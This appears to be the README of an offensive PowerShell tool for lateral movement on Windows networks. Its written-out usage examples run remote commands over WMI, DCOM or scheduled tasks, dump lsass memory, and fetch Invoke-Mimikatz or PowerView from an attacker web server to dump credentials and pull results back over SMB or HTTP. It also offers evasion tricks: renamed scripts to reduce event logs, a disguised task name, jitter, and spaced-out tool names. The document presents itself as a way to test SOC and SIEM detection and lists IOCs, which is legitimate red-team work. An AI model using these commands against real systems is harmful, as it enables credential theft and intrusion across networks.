# Coded by Jesse Nebling (@bashexplode)
#### Description:
Wrapper to run a single command on multiple machines via wmic or DCOM with a single set of user credentials, this script can also perform procdump, 
perform Out-Minidump, or perform Invoke-Mimikatz -DumpCreds and pull the results to your machine from a single or multiple machines. This may be used to test a SOC or SIEM tool with multiple logins to machines. 
YOU MUST HAVE procdump.exe ON YOUR LOCAL MACHINE TO USE THE -ProcDump SWITCH (https://download.sysinternals.com/files/Procdump.zip), if you have an internet connection -DownloadProcDump may be used. 
TO USE THE -InvMkatz OR -MKatz SWITCHES YOU MUST HAVE THE Invoke-Mimikatz.ps1 SCRIPT HOSTED ON A WEB SERVER (https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1).
TO USE -MMCCommand you must currently be in a runas session as a user that has local admin on the remote host

#### Usage:
.EXAMPLE  
Perform ping back to 10.0.0.5 on a single host:  
Invoke-LateralMovement -HostName 10.0.0.2 -WmiCommand -UserName AdminUser -Password P@55w0rd -Domain PWC -IP 10.0.0.5

Perform ping back to 10.0.0.5 on multiple hosts:  
Invoke-LateralMovement -HostList C:\temp\hosts.txt -WmiCommand -UserName AdminUser -Password P@55w0rd -Domain PWC -IP 10.0.0.5

.EXAMPLE  
Open up notepad.exe on a single host with the -CustomCommand flag  
Invoke-LateralMovement -HostName 10.0.0.2 -WmiCommand -UserName AdminUser -Password P@55w0rd -Domain PWC -CustomCommand "cmd.exe /c notepad.exe"

.EXAMPLE  
Perform "vssadmin list shadows" on a single host with the -CustomCommand flag and receive the results with the -Server flag  
Invoke-LateralMovement -HostName 10.0.0.2 -WmiCommand -UserName AdminUser -Password P@55w0rd -Domain PWC -CustomCommand "cmd.exe /c vssadmin list shadows" -Server

-----------------------------

.EXAMPLE  
Perform ping back to 10.0.0.5 on a single host:  
Invoke-LateralMovement -HostName 10.0.0.2 -MMCCommand -IP 10.0.0.5

Perform ping back to 10.0.0.5 on multiple hosts:  
Invoke-LateralMovement -HostList C:\temp\hosts.txt -MMCCommand -IP 10.0.0.5

.EXAMPLE  
Open up notepad.exe on a single host with the -CustomCommand flag  
Invoke-LateralMovement -HostName 10.0.0.2 -MMCCommand -CustomCommand "cmd.exe /c notepad.exe"

.EXAMPLE  
Perform "vssadmin list shadows" on a single host with the -CustomCommand flag and receive the results with the -Server flag  
Invoke-LateralMovement -HostName 10.0.0.2 -MMCCommand -CustomCommand "cmd.exe /c vssadmin list shadows" -Server

-----------------------------

.EXAMPLE  
Perform procdump on a single machine and pull the dump back to your local machine (Default will be on the Desktop):  
Invoke-LateralMovement -HostName 10.0.0.2 -ProcDump -UserName AdminUser -Password P@55w0rd -Domain PWC -PDir C:\temp\procdump.exe

Perform procdump on multiple machines and pull the dump back to your local machine (Default will be on the Desktop):  
Invoke-LateralMovement -HostList C:\temp\hosts.txt -ProcDump -UserName AdminUser -Password P@55w0rd -Domain PWC -PDir C:\temp\procdump.exe

-----------------------------

.EXAMPLE  
Perform a minidump on the lsass process of a single machine and pull dump back to your local machine (Default will be on the Desktop):  
Invoke-LateralMovement -HostName 10.0.0.2 -MiniDump -UserName AdminUser -Password P@55w0rd -Domain PWC

-----------------------------

.EXAMPLE  
Perform I n v o k e - M i m i k a t z -DumpCreds on a single machine and pull results over SMB:  
Invoke-LateralMovement -HostName 10.0.0.2 -InvMkatz -UserName AdminUser -Password P@55w0rd -Domain PWC -ScriptDir http://10.0.0.5/Invoke-Mimikatz.ps1
 
Perform I n v o k e - M i m i k a t z -DumpCreds on a multiple machine and pull results over SMB:  
Invoke-LateralMovement -HostList C:\temp\hosts.txt -InvMkatz -UserName AdminUser -Password P@55w0rd -Domain PWC -ScriptDir http://10.0.0.5/Invoke-Mimikatz.ps1

Perform I n v o k e - M i m i k a t z -DumpCreds on a single machine and pull results over HTTP on port 8080 with a custom script name (Less Windows event logs):  
Invoke-LateralMovement -HostName 10.0.0.2 -MassKatz -UserName AdminUser -Password P@55w0rd -Domain PWC -ScriptDir http://10.0.0.5/Invoke-Update.ps1 -CustomCommand Invoke-Update -ServerPort 8080
 
Perform I n v o k e - M i m i k a t z -DumpCreds on a multiple machine  with a custom script name (Less Windows event logs) and pull results over HTTP on port 80 into the C:\temp folder:  
Invoke-LateralMovement -HostList C:\temp\hosts.txt -MassKatz -UserName AdminUser -Password P@55w0rd -Domain PWC -ScriptDir http://10.0.0.5/Invoke-Update.ps1 -CustomCommand Invoke-Update -OutputFolder "C:\temp"

.EXAMPLE  
Perform Get-DomainGroupMember on a single machine and pull results over HTTP on port 8080 with a custom script name (Less Windows event logs):  
Invoke-LateralMovement -HostName 10.0.0.2 -ExecPS -UserName AdminUser -Password P@55w0rd -Domain PWC -ScriptDir http://10.0.0.5/PowerView.ps1 -CustomCommand "Get-DomainGroupMember 'Domain Admins'" 
 
Perform Get-DomainGroupMember on a multiple machine and pull results over HTTP on port 8080 with a custom script name (Less Windows event logs):  
Invoke-LateralMovement -HostList C:\temp\hosts.txt -ExecPS -UserName AdminUser -Password P@55w0rd -Domain PWC -ScriptDir http://10.0.0.5/PowerView.ps1 -CustomCommand "Get-DomainGroupMember 'Domain Admins'" 

-----------------------------
#### Parameter Sets:

.PARAMETER HostName  
Specifies single host to run command on

.PARAMETER HostList  
Specifies the file to read a list of hosts from, separated by newline.

.PARAMETER UserName  
Specifies the username to use for the command

.PARAMETER Password  
Specifies the password of the user

.PARAMETER Domain  
Specifies Domain of the user account being used.

.PARAMETER OutputFolder  
Specify output folder name and/or location on your local machine. (Default is current user's Desktop)

.SWITCH Delete  
To be used with the -SchTasks switch, will delete the task created on a remote machine.

----------------------------

.SWITCH WmiCommand  
Specifies that a [schtask, wmic, or Invoke-Wmimethod] command will be run on the corresponding hosts. Will ping an IP by default, unless given the -CustomCommand flag.

.PARAMETER IP  
Specifies the IP the compromised machine will ping.

.PARAMETER CustomCommand  
Specifies a custom command, if the user wants to take other actions than ping.

.SWITCH GoldenTicket  
Specifies that if a golden ticket is in use to use the correct syntax.

\  
&nbsp;&nbsp;&nbsp;&nbsp;.SWITCH SchTasks  
&nbsp;&nbsp;&nbsp;&nbsp;Specifies that a task will be created on the remote machine instead of using wmic.

&nbsp;&nbsp;&nbsp;&nbsp;.PARAMETER TaskTime  
&nbsp;&nbsp;&nbsp;&nbsp;Specifies the time the task will be run. [24-hour clock]

&nbsp;&nbsp;&nbsp;&nbsp;.PARAMETER TaskName  
&nbsp;&nbsp;&nbsp;&nbsp;Specifies the name of the task that will be created. (By default it is set to "OfficeTe1emetryAgentLogOn")  
/

\  
&nbsp;&nbsp;&nbsp;&nbsp;.SWITCH Server  
&nbsp;&nbsp;&nbsp;&nbsp;Commands results are recieved by webserver and output into a text file.

&nbsp;&nbsp;&nbsp;&nbsp;.PARAMETER ServerPort  
&nbsp;&nbsp;&nbsp;&nbsp;Specifies what port the web server that collects output will be run on. (Port 80 by default)

&nbsp;&nbsp;&nbsp;&nbsp;.SWITCH FirewallRule  
&nbsp;&nbsp;&nbsp;&nbsp;Add (and then remove) a firewall rule to allow access to port $ServerPort.  
/

----------------------------

.SWITCH MMCCommand  
Specifies that a MMC command will be run on the corresponding hosts. Will ping an IP by default, unless given the -CustomCommand flag. [ONLY WORKS IN A RUNAS CONTEXT]

.PARAMETER IP  
Specifies the IP the compromised machine will ping.

.PARAMETER CustomCommand  
Specifies a custom command, if the user wants to take other actions than ping.

-----------------------------

.SWITCH ProcDump  
Specifies that ProcDump will be run on the specified hosts.

.SWITCH DownloadProcDump  
Downloads procdump.exe from sysinternals and puts it into C:\Windows\Temp, if this switch is used -PDir doesn't need to be specified

.SWITCH GoldenTicket  
Specifies that if a golden ticket is in use to use the correct syntax.

\  
&nbsp;&nbsp;&nbsp;&nbsp;.SWITCH SchTasks  
&nbsp;&nbsp;&nbsp;&nbsp;Specifies that a task will be created on the remote machine instead of using wmic.

&nbsp;&nbsp;&nbsp;&nbsp;.PARAMETER TaskTime  
&nbsp;&nbsp;&nbsp;&nbsp;Specifies the time the task will be run. [24-hour clock]

&nbsp;&nbsp;&nbsp;&nbsp;.PARAMETER TaskName  
&nbsp;&nbsp;&nbsp;&nbsp;Specifies the name of the task that will be created. (By default it is set to "OfficeTe1emetryAgentLogOn")  
/


.PARAMETER PDir  
Specifies the full filepath of Procdump.exe on the local machine.

.PARAMETER DumpDir  
Specifies where files will get dumped on the target machines. Set to "C:\Windows\Temp" by default.

-----------------------------

.SWITCH MiniDump  
Specifies that Out-Minidump will be run on the specified hosts.

.PARAMETER DumpDir  
Specifies where files will get dumped on the target machines. Set to "C:\Windows\Temp" by default.

.PARAMETER Process  
Specifies the process that will be dumped by name. (lsass by default)

-----------------------------

.SWITCH InvMkatz  
Specifies that Invoke-M i m i ka t z will be run on the specified hosts with results pulled back over SMB.

.PARAMETER CustomCommand  
Specifies a custom script command for Invoke- m i m i k a t z.(i.e. Invoke-Updates)

.PARAMETER ScriptDir  
Specifies the full URL path of the Invoke-m i m i k a t z .ps1 script on a web server.

-----------------------------

.SWITCH MassKatz  
Specifies that Invoke-M i m i k a t z will be run on the specified hosts with results pulled back over HTTP. [REQUIRES LOCAL ADMIN ON HOST MACHINE]

.PARAMETER CustomCommand  
Specifies a custom script command for I n v o k e - m i m i k a t z.(i.e. Invoke-Updates)

.PARAMETER ScriptDir  
Specifies the full URL path of the I n v o k e - m i m i k a t z .ps1 script on a web server.

.PARAMETER FirewallRule  
Add (and then remove) a firewall rule to allow access to port $ServerPort.

.PARAMETER ServerPort  
Specifies what port the web server that collects output will be run on. (Port 80 by default)

-----------------------------

.SWITCH ExecPS  
Specifies that a PowerShell script will be run on the specified hosts with results pulled back over HTTP. [REQUIRES LOCAL ADMIN ON HOST MACHINE]

.PARAMETER CustomCommand  
Specifies a custom script command to use.(i.e. Invoke-Updates, Invoke-StealthUserHunter -GroupName "Server Admins", etc)

.PARAMETER ScriptDir  
Specifies the full URL path of the script on a web server.

.PARAMETER FirewallRule  
Add (and then remove) a firewall rule to allow access to port $ServerPort.

.PARAMETER ServerPort  
Specifies what port the web server that collects output will be run on. (Port 80 by default)

-----------------------------

.PARAMETER Delay  
Delay between running commands, defaults to 0

.PARAMETER Jitter  
Jitter for the command delay, defaults to +/- 0.3


IOCs:  
NetLogon Type 3 for all command executions  
If the option is taken to pull information over SMB for command output, that file is written to C:\Windows\Temp unless otherwise specified  
Memory dumps are written to C:\Windows\Temp unless otherwise specified  
If unobfuscated versions of scripts are used, then those in themselves can be IOCs


Suggested Improvements:  
Script optimization - was scripted to work, definitely can be structured better
